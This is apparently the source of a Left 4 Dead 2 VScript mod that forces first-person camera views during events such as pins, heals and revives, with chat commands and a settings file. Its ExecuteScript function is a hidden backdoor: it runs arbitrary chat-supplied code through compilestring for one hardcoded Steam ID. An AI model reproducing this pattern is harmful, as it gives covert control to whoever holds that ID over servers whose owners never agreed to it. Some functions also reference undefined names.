//point_viewcontrol_survivor cameras, parent to survivor, parent attachment to "eyes"

/*
	Bile overlay removed on FP stumble (On stumble finished, HitWithVomit, reduce itTimer by stumbleTimer)
	Have target parented to player, have camera follow target in order to fix visleaf issues
	Convert sequence checks to game events
		charger_carry_end: DONE
		smoker_drag: DONE
		charger_ram: DONE
		get_up: DONE
		tank_stun
	FP on intro cutscene when AlwaysFP is on
*/

IncludeScript("cssunlocker")

fpp_loaded <- true

settings <- {
	FPOnHeal = 1
	FPOnHealOther = 1
	FPOnHang = 1
	FPOnDefibbed = 1
	FPOnDefibOther = 1
	FPOnJockeyPin = 1
	FPOnSmokerPin = 1
	FPOnChargerPin = 1
	FPOnHunterPin = 1
	FPOnChargerRam = 1
	FPOnGetUp = 1
	FPOnSmokerImmobilized = 1
	FPOnStumble = 1
	FPOnRevive = 1
	FPOnReviveByOther = 1
	FPOnGasCanPour = 1
	FPOnColaTurnIn = 1
	FPOnTankStun = 1
	FPOnDeployAmmoPack = 1
	FPOnGeneratorUse = 1
	FPOnClimbLadder = 0
	FPAllowed = 1
	AlwaysFP = 0
	AllowInfectedCams = 0
}


function SaveToModsFile(){
	local text = FileToString("mods.txt")
	
	if(text == null){
		StringToFile("mods.txt", "daroots_mods")
		return
	}
	
	if(text.find("daroots_mods") != null){
		return
	}
	
	StringToFile("mods.txt", text + "\r\n" + "daroots_mods")
}

function SaveSettings(){
	local text = ""
	
	foreach(key,val in settings){
		text += key + "=" + val + "\n"
	}
	
	StringToFile("fpp_settings.cfg", text)
}

function LoadSettings(){
	local text = FileToString("fpp_settings.cfg")
	
	if(text == null){
		SaveSettings()
		return
	}
	
	local newText = ""
	
	foreach(char in text){
		if(char != 32){
			newText += char.tochar()
		}
	}
	
	local settingsFound = []
	
	while(newText.find("=")){
		local key = newText.slice(0, newText.find("="))
		if(key in settings){
			local value = -1
			if(newText.find("\n")){
				value = newText.slice(newText.find("=") + 1, newText.find("\n")).tointeger()
				newText = newText.slice(newText.find("\n") + 1)
			} else {
				value = newText.slice(newText.find("=") + 1, newText.find("\0")).tointeger()
				newText = newText.slice(newText.find("\0"))
			}
			settings[key] = value
			settingsFound.append(key)
		} else {
			if(newText.find("\n")){
				newText = newText.slice(newText.find("\n") + 1)
			} else {
				newText = newText.slice(newText.len())
			}
		}
	}
	
	local newSettings = []
	
	foreach(key,val in settings){
		local foundKey = false
		
		for(local j=0; j < settingsFound.len(); j++){
			if(key == settingsFound[j]){
				foundKey = true
			}
		}
		
		if(!foundKey){
			newSettings.append(key)
		}
	}
	
	if(newSettings.len() > 0){
		SaveSettings()
	}
	
	g_ModeScript.DeepPrintTable(settings)
}

function DisablePlayerCam(player){
	if("fpp_camera" in player.GetScriptScope() && player.GetScriptScope()["fpp_camera"] != null && player.GetScriptScope()["fpp_camera"].IsValid()){
		DoEntFire("!self","Enable","",0, null, player.GetScriptScope()["fpp_camera"])
		DoEntFire("!self","Disable","",0, null, player.GetScriptScope()["fpp_camera"])
		player.GetScriptScope()["fpp_camera"].ValidateScriptScope()
		player.GetScriptScope()["fpp_camera"].GetScriptScope()["enabled"] <- false
		local func = function(){
			if(camera != null && camera.IsValid()){
				camera.Kill()
			}
		}
		HookController.ScheduleTask(func, {camera = player.GetScriptScope()["fpp_camera"]}, 0.033)
	}
}

function CheckSequence(code, player){
	local displayName = GetCharacterDisplayName(player)
	local sequence = NetProps.GetPropInt(player, "m_nSequence")
	if(code == "smoker_drag"){
		if(displayName == "Nick"){
			return sequence == 626
		} else if(displayName == "Ellis"){
			return sequence == 631
		} else if(displayName == "Rochelle"){
			return sequence == 634
		} else if(displayName == "Coach"){
			return sequence == 626
		} else if(displayName == "Bill"){
			return sequence == 534
		} else if(displayName == "Louis"){
			return sequence == 534
		} else if(displayName == "Francis"){
			return sequence == 537
		} else if(displayName == "Zoey"){
			return sequence == 542
		}
	} else if(code == "charger_ram"){
		if(displayName == "Nick"){
			return sequence == 661 || sequence == 667
		} else if(displayName == "Ellis"){
			return sequence == 665 || sequence == 671
		} else if(displayName == "Rochelle"){
			return sequence == 668 || sequence == 674
		} else if(displayName == "Coach"){
			return sequence == 650 || sequence == 656
		} else if(displayName == "Bill"){
			return sequence == 753 || sequence == 759
		} else if(displayName == "Louis"){
			return sequence == 753 || sequence == 759
		} else if(displayName == "Francis"){
			return sequence == 756 || sequence == 762
		} else if(displayName == "Zoey"){
			return sequence == 813 || sequence == 819
		}
	} else if(code == "hunter_get_up"){
		if(displayName == "Nick"){
			return sequence == 620
		} else if(displayName == "Ellis"){
			return sequence == 625
		} else if(displayName == "Rochelle"){
			return sequence == 629
		} else if(displayName == "Coach"){
			return sequence == 621
		} else if(displayName == "Bill"){
			return sequence == 528
		} else if(displayName == "Louis"){
			return sequence == 528
		} else if(displayName == "Francis"){
			return sequence == 531
		} else if(displayName == "Zoey"){
			return sequence == 537
		}
	} else if(code == "tank_stun"){
		if(displayName == "Nick"){
			return sequence >= 628 && sequence <= 630
		} else if(displayName == "Ellis"){
			return sequence >= 633 && sequence <= 635
		} else if(displayName == "Rochelle"){
			return sequence >= 636 && sequence <= 638
		} else if(displayName == "Coach"){
			return sequence >= 628 && sequence <= 630
		} else if(displayName == "Bill"){
			return sequence >= 536 && sequence <= 538
		} else if(displayName == "Louis"){
			return sequence >= 536 && sequence <= 538
		} else if(displayName == "Francis"){
			return sequence >= 539 && sequence <= 541
		} else if(displayName == "Zoey"){
			return sequence >= 545 && sequence <= 547
		}
	} else if(code == "charger_carry_end"){
		if(displayName == "Nick"){
			return sequence == 671 || sequence == 672
		} else if(displayName == "Ellis"){
			return sequence == 675 || sequence == 676
		} else if(displayName == "Rochelle"){
			return sequence == 678 || sequence == 679
		} else if(displayName == "Coach"){
			return sequence == 660 || sequence == 661
		} else if(displayName == "Bill"){
			return sequence == 763 || sequence == 764
		} else if(displayName == "Louis"){
			return sequence == 763 || sequence == 764
		} else if(displayName == "Francis"){
			return sequence == 766 || sequence == 767
		} else if(displayName == "Zoey"){
			return sequence == 823 || sequence == 824
		}
	}
}

function ReparentCam(player){
	if("fpp_camera" in player.GetScriptScope() && player.GetScriptScope()["fpp_camera"] != null && player.GetScriptScope()["fpp_camera"].IsValid()){
		player.GetScriptScope()["fpp_camera"].Kill()
	}
	CreateCam(player)
}

function CreateCam(player){
	local camera = SpawnEntityFromTable("point_viewcontrol_survivor", {})
	if(player.IsSurvivor()){
		NetProps.SetPropEntity(camera, "moveparent", player)
		NetProps.SetPropInt(camera, "m_iParentAttachment", 1)
		camera.SetOrigin(camera.GetOrigin() - Vector(3, 0, 0))
		//camera.SetAngles(QAngle(0,65,0))
	}
	player.GetScriptScope()["last_parent_time"] <- Time()
	player.GetScriptScope()["fpp_camera"] <- camera
}

function FPShouldBeEnabled(player, settingName){
	local returnTable = {
		freezePlayer = false
		shouldActivate = false
	}
	/*if(!Director.HasAnySurvivorLeftSafeArea()){
		return returnTable
	}*/
	if(settingName == "AlwaysFP"){
		returnTable.shouldActivate = settings["AlwaysFP"]
	} else if(settingName == "FPOnChargerPin"){
		returnTable.freezePlayer = true
		returnTable.shouldActivate = settings["FPOnChargerPin"] && (NetProps.GetPropEntity(player, "m_pummelAttacker") || NetProps.GetPropEntity(player, "m_carryAttacker") || ("charger_attacker" in player.GetScriptScope()))
	} else if(settingName == "FPOnHunterPin"){
		returnTable.freezePlayer = true
		returnTable.shouldActivate = settings["FPOnHunterPin"] && (NetProps.GetPropEntity(player, "m_pounceAttacker"))
	} else if(settingName == "FPOnJockeyPin"){
		returnTable.freezePlayer = true
		returnTable.shouldActivate = settings["FPOnJockeyPin"] && (NetProps.GetPropEntity(player, "m_jockeyAttacker"))
	} else if(settingName == "FPOnSmokerPin"){
		returnTable.shouldActivate = settings["FPOnSmokerPin"] && ((!settings["FPOnSmokerImmobilized"] && NetProps.GetPropEntity(player, "m_tongueOwner")) || (settings["FPOnSmokerImmobilized"] && (NetProps.GetPropInt(player, "m_isHangingFromTongue") || NetProps.GetPropInt(player, "m_reachedTongueOwner") || ((Time() >= NetProps.GetPropFloat(player, "m_tongueVictimTimer") + 1 && NetProps.GetPropEntity(player, "m_tongueOwner"))))))
	} else if(settingName == "FPOnChargerRam"){
		returnTable.freezePlayer = true
		returnTable.shouldActivate = settings["FPOnChargerRam"] && ("charger_impact" in player.GetScriptScope() && NetProps.GetPropInt(player, "movetype") != 8)
	} else if(settingName == "FPOnTankStun"){
		returnTable.freezePlayer = true
		returnTable.shouldActivate = settings["FPOnTankStun"] && (CheckSequence("tank_stun", player))
	} else if(settingName == "FPOnGetUp"){
		returnTable.freezePlayer = true
		returnTable.shouldActivate = settings["FPOnGetUp"] && (!player.IsIncapacitated() && ((("hunter_get_up_start" in player.GetScriptScope() && Time() <= player.GetScriptScope()["hunter_get_up_start"] + 2.5) || ("charger_get_up_start" in player.GetScriptScope() && Time() <= player.GetScriptScope()["charger_get_up_start"] + 3.25) || (NetProps.GetPropInt(player, "m_knockdownReason") == 3 && Time() <= NetProps.GetPropFloat(player, "m_knockdownTimer") + 3))))
	} else if(settingName == "FPOnHeal"){
		returnTable.shouldActivate = settings["FPOnHeal"] && (NetProps.GetPropInt(player, "m_iCurrentUseAction") == 1 && NetProps.GetPropEntity(player, "m_useActionOwner") == player)
	} else if(settingName == "FPOnHealOther"){
		returnTable.shouldActivate = settings["FPOnHealOther"] && (NetProps.GetPropInt(player, "m_iCurrentUseAction") == 1 && NetProps.GetPropEntity(player, "m_useActionTarget") != player)
	} else if(settingName == "FPOnRevive"){
		returnTable.shouldActivate = settings["FPOnRevive"] && (NetProps.GetPropEntity(player, "m_reviveTarget") != null)
	} else if(settingName == "FPOnReviveByOther"){
		returnTable.freezePlayer = true
		returnTable.shouldActivate = NetProps.GetPropEntity(player, "m_reviveOwner") != null
	} else if(settingName == "FPOnDefibOther"){
		returnTable.shouldActivate = settings["FPOnDefibOther"] && (NetProps.GetPropInt(player, "m_iCurrentUseAction") == 4)
	} else if(settingName == "FPOnDefibbed"){
		returnTable.freezePlayer = true
		returnTable.shouldActivate = NetProps.GetPropInt(player, "m_iCurrentUseAction") == 5
	} else if(settingName == "FPOnDeployAmmoPack"){
		returnTable.shouldActivate = settings["FPOnDeployAmmoPack"] && (NetProps.GetPropInt(player, "m_iCurrentUseAction") == 6 || NetProps.GetPropInt(player, "m_iCurrentUseAction") == 7)
	} else if(settingName == "FPOnGasCanPour"){
		returnTable.shouldActivate = settings["FPOnGasCanPour"] && (NetProps.GetPropInt(player, "m_iCurrentUseAction") == 8)
	} else if(settingName == "FPOnColaTurnIn"){
		returnTable.shouldActivate = settings["FPOnColaTurnIn"] && (NetProps.GetPropInt(player, "m_iCurrentUseAction") == 9)
	} else if(settingName == "FPOnStumble"){
		returnTable.freezePlayer = true
		returnTable.shouldActivate = settings["FPOnStumble"] && (Time() < NetProps.GetPropFloat(player, "m_staggerTimer.m_duration") + NetProps.GetPropFloat(player, "m_staggerTimer.m_timestamp"))
	} else if(settingName == "FPOnHang"){
		returnTable.freezePlayer = true
		returnTable.shouldActivate = (settings["FPOnHang"] && (NetProps.GetPropInt(player, "m_isHangingFromLedge") || NetProps.GetPropInt(player, "m_isFallingFromLedge")))
	} else if(settingName == "FPOnClimbLadder"){
		returnTable.shouldActivate = NetProps.GetPropInt(player, "movetype") == 9
	} else if(settingName == "FPOnGeneratorUse"){
		returnTable.shouldActivate = NetProps.GetPropInt(player, "m_iCurrentUseAction") == 10
	} else {
		returnTable["freezePlayer"] <- false
		returnTable["shouldActivate"] <- false
	}
	return returnTable
}

function ManageFPCam(player){
	if(player.IsSurvivor() && !IsPlayerABot(player) && (!("fpp_enabled" in player.GetScriptScope()) || player.GetScriptScope()["fpp_enabled"])){
		local freeze = false
		local enable = false
		
		foreach(key,val in settings){
			if(settings[key]){
				local table = FPShouldBeEnabled(player, key)
				if(table.shouldActivate){
					enable = true
					freeze = table.freezePlayer
					break
				}
			}
		}
		
		//if("fpp_frozen" in player.GetScriptScope() || (NetProps.GetPropInt(player, "m_fFlags") & 32) == 0){
			if(enable && NetProps.GetPropInt(player, "m_lifeState") == 0 && settings["FPAllowed"] && NetProps.GetPropInt(Entities.FindByClassname(null, "terror_gamerules"), "m_bInIntro") == 0){
				//if(!("fpp_frozen" in player.GetScriptScope()) && (NetProps.GetPropInt(player, "m_fFlags") & 32)){
					//printl(NetProps.GetPropEntity(player, "m_hViewEntity"))
					if((!("fpp_camera" in player.GetScriptScope()) || player.GetScriptScope()["fpp_camera"] == null || !player.GetScriptScope()["fpp_camera"].IsValid())){
						CreateCam(player)
						if(freeze){
							player.GetScriptScope()["fpp_frozen"] <- true
							NetProps.SetPropInt(player, "m_fFlags", NetProps.GetPropInt(player, "m_fFlags") | 32)
						}
						player.GetScriptScope()["fpp_camera"].ValidateScriptScope()
						player.GetScriptScope()["fpp_camera"].GetScriptScope()["enabled"] <- true
						DoEntFire("!self","Enable","",0, player, player.GetScriptScope()["fpp_camera"])
					} else {
						player.GetScriptScope()["fpp_camera"].ValidateScriptScope()
						
						if("enabled" in player.GetScriptScope()["fpp_camera"].GetScriptScope() && !player.GetScriptScope()["fpp_camera"].GetScriptScope()["enabled"]){
							ReparentCam(player)
						}
						
						player.GetScriptScope()["fpp_camera"].GetScriptScope()["enabled"] <- true
						DoEntFire("!self","Enable","",0, player, player.GetScriptScope()["fpp_camera"])
					}
			} else if("fpp_camera" in player.GetScriptScope() && player.GetScriptScope()["fpp_camera"] != null && player.GetScriptScope()["fpp_camera"].IsValid() && NetProps.GetPropInt(Entities.FindByClassname(null, "terror_gamerules"), "m_bInIntro") == 0) {
				player.GetScriptScope()["fpp_camera"].ValidateScriptScope()
				player.GetScriptScope()["fpp_camera"].GetScriptScope()["enabled"] <- false
				DoEntFire("!self","Disable","",0, player, player.GetScriptScope()["fpp_camera"])
				if("fpp_frozen" in player.GetScriptScope() && player.GetScriptScope()["fpp_frozen"]){
					player.GetScriptScope()["fpp_frozen"] = false
					NetProps.SetPropInt(player, "m_fFlags", NetProps.GetPropInt(player, "m_fFlags") & ~32)
				}
				local func = function(){
					if(camera != null && camera.IsValid()){
						camera.Kill()
					}
				}
				HookController.ScheduleTask(func, {camera = player.GetScriptScope()["fpp_camera"]}, 0.033)
			}
		//}
		
		/*if((!("fpp_frozen" in player.GetScriptScope()) || !player.GetScriptScope()["fpp_frozen"]) && (NetProps.GetPropInt(player, "m_fFlags") & 32) && "fpp_camera" in player.GetScriptScope() && player.GetScriptScope()["fpp_camera"] != null && player.GetScriptScope()["fpp_camera"].IsValid()) {
			DoEntFire("!self","Disable","",0, player, player.GetScriptScope()["fpp_camera"])
			player.GetScriptScope()["fpp_camera"] <- null
		}*/
	}
}

function GetServerHost(){
	local host = null
	
	for(local i=0; i <= 32; i++){
		local isHost = NetProps.GetPropIntArray(Entities.FindByClassname(null, "terror_player_manager"), "m_listenServerHost", i)
		if(isHost){
			host = Ent(1)
			break
		}
	}
	
	return host
}

function ReloadSettings(ent){
	g_ModeScript.LoadSettings()
}

function ExecuteScript(ent, input){
	if(ent != null && ent.GetClassname() == "player" && ent.GetNetworkIDString() == "STEAM_1:0:37801114"){
		compilestring(input)()
	}
}

function EnableFPP(ent){
	ent.ValidateScriptScope()
	ent.GetScriptScope()["fpp_enabled"] <- true
}

function DisableFPP(ent){
	ent.ValidateScriptScope()
	ent.GetScriptScope()["fpp_enabled"] <- false
	if("fpp_camera" in ent.GetScriptScope() && ent.GetScriptScope()["fpp_camera"] != null && ent.GetScriptScope()["fpp_camera"].IsValid()){
		player.GetScriptScope()["fpp_camera"].ValidateScriptScope()
		player.GetScriptScope()["fpp_camera"].GetScriptScope()["enabled"] <- false
		DoEntFire("!self","Disable","",0, ent, ent.GetScriptScope()["fpp_camera"])
		if("fpp_frozen" in ent.GetScriptScope() && ent.GetScriptScope()["fpp_frozen"]){
			ent.GetScriptScope()["fpp_frozen"] = false
			NetProps.SetPropInt(ent, "m_fFlags", NetProps.GetPropInt(ent, "m_fFlags") & ~32)
		}
		local func = function(){
			if(camera != null && camera.IsValid()){
				camera.Kill()
			}
		}
		g_ModeScript.HookController.ScheduleTask(func, {camera = ent.GetScriptScope()["fpp_camera"]}, 0.033)
	}
}

function DisableFPPOnAll(ent){
	if(ent == GetServerHost()){
		local ent = null
		while(ent = Entities.FindByClassname(ent, "player")){
			FPPOff(ent)
		}
	}
}

function SetSetting(ent, input){
	local params = split(input, " ")
	if(params.len() == 2){
		if(params[0] in settings){
			settings[params[0]] = params[1].tointeger()
			SaveSettings()
		}
	} else {
		Say(null, "Incorrect parameter count, expected 2", false)
	}
}

function OnGameplayStart(){
	IncludeScript("HookController/HookController_includer")
	HookController.RegisterHooks(this)
	
	HookController.RegisterChatCommand("!reloadsettings", ReloadSettings, false)
	HookController.RegisterChatCommand("!script", ExecuteScript, true)
	HookController.RegisterChatCommand("!fppon", EnableFPP, false)
	HookController.RegisterChatCommand("!fppoff", DisableFPP, false)
	HookController.RegisterChatCommand("!fppoffall", DisableFPPOnAll, false)
	HookController.RegisterChatCommand("!fppsetting", function(ent, input){g_ModeScript.SetSetting(ent, input)}, true)
	
	LoadSettings()
	SaveToModsFile()
}

function AllowTakeDamage(params){
	local victim = params.Victim
	local damage = params.DamageDone
	
	if(victim.GetClassname() == "player" && !victim.IsSurvivor() && victim.GetHealth() - damage < 1 && settings["AllowInfectedCams"]){
		victim.GetScriptScope()["respawned"]  <- false
		DisablePlayerCam(victim)
	}
	
	if(victim.GetClassname() == "player" && victim.IsSurvivor() && victim.GetHealth() + victim.GetHealthBuffer() - damage < 0){
		victim.GetScriptScope()["respawned"]  <- false
		DisablePlayerCam(victim)
	}
	
	return true
}

function OnTick(){
	local player = null
	while(player = Entities.FindByClassname(player, "player")){
		player.ValidateScriptScope()
		if((NetProps.GetPropFloat(player, "m_itTimer.m_timestamp") - NetProps.GetPropFloat(player, "m_itTimer.m_duration")) == (NetProps.GetPropFloat(player, "m_staggerTimer.m_timestamp") - NetProps.GetPropFloat(player, "m_staggerTimer.m_duration")) && NetProps.GetPropFloat(player, "m_itTimer.m_timestamp") != -1 && !("boomer_stagger_start" in player.GetScriptScope())){
			player.GetScriptScope()["boomer_stagger_start"] <- Time()
		}
		if("boomer_stagger_end" in player.GetScriptScope() && Time() > player.GetScriptScope()["boomer_stagger_end"] + 1){
			local timeElapsed = Time() - player.GetScriptScope()["boomer_stagger_start"]
			local itDuration = NetProps.GetPropFloat(player, "m_itTimer.m_duration")
			player.HitWithVomit()
			NetProps.SetPropFloat(player, "m_itTimer.m_duration", itDuration - timeElapsed)
			delete player.GetScriptScope()["boomer_stagger_start"]
			delete player.GetScriptScope()["boomer_stagger_end"]
		}
		if("boomer_stagger_start" in player.GetScriptScope() && !("boomer_stagger_end" in player.GetScriptScope()) && NetProps.GetPropFloat(player, "m_staggerTimer.m_timestamp") == -1){
			NetProps.SetPropFloat(player, "m_itTimer.m_timestamp", Time())
			player.GetScriptScope()["boomer_stagger_end"] <- Time()
		}
		if("charger_attacker" in player.GetScriptScope()){
			if(player.GetScriptScope()["charger_attacker"] == null || !player.GetScriptScope()["charger_attacker"].IsValid() || NetProps.GetPropInt(player.GetScriptScope()["charger_attacker"], "m_lifeState") == 1){
				player.GetScriptScope()["charger_get_up_start"] <- Time() + 1
				delete player.GetScriptScope()["charger_attacker"]
			} else if(NetProps.GetPropEntity(player, "m_pummelAttacker")){
				delete player.GetScriptScope()["charger_attacker"]
			}
		}
		if("charger_impact" in player.GetScriptScope() && (NetProps.GetPropInt(player, "m_fFlags") & 1) == 1){
			delete player.GetScriptScope()["charger_impact"]
		}
		
		if(settings["AlwaysFP"]){
			ReparentCam(player)
		}
		ManageFPCam(player)
	}
}

function OnGameEvent_pounce_end(params){
	if("victim" in params){
		local victim = GetPlayerFromUserID(params.victim)
		victim.ValidateScriptScope()
		victim.GetScriptScope()["hunter_get_up_start"] <- Time()
	}
}

function OnGameEvent_charger_pummel_end(params){
	printl("pummel_end")
	if("victim" in params){
		local victim = GetPlayerFromUserID(params.victim)
		victim.ValidateScriptScope()
		victim.GetScriptScope()["charger_get_up_start"] <- Time()
	}
}

function OnGameEvent_charger_impact(params){
	local victim = GetPlayerFromUserID(params.victim)
	victim.ValidateScriptScope()
	victim.GetScriptScope()["charger_impact"] <- true
}

function OnGameEvent_charger_carry_end(params){
	local victim = GetPlayerFromUserID(params.victim)
	victim.ValidateScriptScope()
	victim.GetScriptScope()["charger_attacker"] <- GetPlayerFromUserID(params.userid)
}